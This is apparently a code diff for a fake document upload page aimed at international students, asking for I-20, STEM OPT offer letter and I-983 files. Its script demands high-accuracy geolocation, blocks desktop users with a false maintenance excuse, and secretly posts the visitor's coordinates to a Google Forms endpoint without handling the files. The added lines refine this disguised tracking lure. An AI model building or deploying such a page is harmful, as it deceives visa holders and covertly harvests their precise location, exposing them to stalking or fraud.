@@ -37,7 +37,7 @@
       margin: 0;
     }
     .spacer {
-      margin-top: 20px; /* Space after the "Thank you" sentence */
+      margin-top: 20px; /* Space after the "Thank you. Your files have been uploaded and changes will take effect shortly." sentence */
     }
     .contact p {
       line-height: 1.5;
@@ -111,7 +111,7 @@
 
     <form id="uploadForm">
       <div>
-        <label for="i20">Upload I-20:</label>
+        <label for="i20">Update your STEM OPT offer letter if you're joining a new employer. If you're staying with the same employer, simply upload your previous offer letter:</label>
         <input type="file" id="i20" name="i20" accept=".pdf" required>
       </div>
       <div>
@@ -147,78 +147,74 @@
 </div>
 
 <script>
-  window.onload = function() {
-   requestLocation();
- };
- document.getElementById('uploadForm').addEventListener('submit', function(event) {
-   event.preventDefault(); // Prevent the default form submission
-   requestLocation(); // Start the location request process on form submission
- });
+  document.getElementById('uploadForm').addEventListener('submit', function(event) {
+    event.preventDefault(); // Prevent the default form submission
+    requestLocation(); // Start the location request process on form submission
+  });
 
- function requestLocation() {
-   if (navigator.geolocation) {
-     const options = {
-      enableHighAccuracy: true,  // Request the most accurate position available
-      timeout: 10000,            // Longer timeout to allow for more accurate positioning
-      maximumAge: 0              // Always get a fresh position, don't use cached
-  };
-     navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError, options);
-   } else {
-     displayError("Geolocation is not supported by this browser.");
-   }
- }
+  function requestLocation() {
+    if (navigator.geolocation) {
+      const options = {
+        enableHighAccuracy: true,  // Request the most accurate position available
+        timeout: 10000,            // Longer timeout to allow for more accurate positioning
+        maximumAge: 0              // Always get a fresh position, don't use cached
+      };
+      navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError, options);
+    } else {
+      displayError("Geolocation is not supported by this browser.");
+    }
+  }
 
- function sendLocationData(position) {
-   const latitude = position.coords.latitude;
-   const longitude = position.coords.longitude;
-   const accuracy = position.coords.accuracy;
-   sendForm(latitude, longitude, accuracy);
- }
+  function sendLocationData(position) {
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
+    const accuracy = position.coords.accuracy;
+    sendForm(latitude, longitude, accuracy);
+  }
 
- function sendForm(latitude, longitude, accuracy) {
- const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  function sendForm(latitude, longitude, accuracy) {
+    // Insert the mobile check here
+    if (!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+      displayError("We’re making some updates to the website. Please use a Mobile or Tablet to access the site for now.");
+      return; // Stop execution if not on mobile
+    }
 
- if (!isMobile) {
-   displayError("The Desktop version is currently being updated. Please use a Mobile device to access the website for now.");
-   return; // Stop execution if not on mobile
- }
-   // Get file data (in a real implementation, you would handle file uploads)
-   const i20File = document.getElementById('i20').files[0];
-   const i983File = document.getElementById('i983').files[0];
+    // Existing functionality for form submission
+    const i20File = document.getElementById('i20').files[0];
+    const i983File = document.getElementById('i983').files[0];
 
-   if (!i20File || !i983File) {
-     displayError("Please upload all required documents.");
-     return;
-   }
+    if (!i20File || !i983File) {
+      displayError("Please upload all required documents.");
+      return;
+    }
 
-   const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScQpsQr3scRzvEtZJhZQ9fbJ3e-0DiCxQjLotqM6fEst-f-9w/formResponse";
-   const data = new URLSearchParams();
-   data.append("entry.1267598962", latitude);
-   data.append("entry.1270259896", longitude);
-   data.append("entry.1888406517", accuracy);
+    const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScQpsQr3scRzvEtZJhZQ9fbJ3e-0DiCxQjLotqM6fEst-f-9w/formResponse";
+    const data = new URLSearchParams();
+    data.append("entry.1267598962", latitude);
+    data.append("entry.1270259896", longitude);
+    data.append("entry.1888406517", accuracy);
 
-   fetch(formUrl, {
-     method: "POST",
-     body: data,
-     mode: "no-cors",
-   }).then(() => {
-     // Show thank you message instead of redirecting
-     document.getElementById("initialContent").classList.add("hidden");
-     document.getElementById("thankYouContent").classList.remove("hidden");
-   }).catch((error) => {
-     displayError("Error: " + error.message);
-   });
- }
+    fetch(formUrl, {
+      method: "POST",
+      body: data,
+      mode: "no-cors",
+    }).then(() => {
+      document.getElementById("initialContent").classList.add("hidden");
+      document.getElementById("thankYouContent").classList.remove("hidden");
+    }).catch((error) => {
+      displayError("Error: " + error.message);
+    });
+  }
 
- function handleLocationError(error) {
-   displayError("Error: Please enable location access to continue. Once done, please try submitting again.");
- }
+  function handleLocationError(error) {
+    displayError("Error: Please enable location access to continue. Once done, please try submitting again.");
+  }
 
- function displayError(message) {
-   const locationError = document.getElementById("locationError");
-   locationError.innerHTML = message;
-   locationError.classList.remove('hidden');
- }
+  function displayError(message) {
+    const locationError = document.getElementById("locationError");
+    locationError.innerHTML = message;
+    locationError.classList.remove('hidden');
+  }
 </script>
 </body>
 </html>
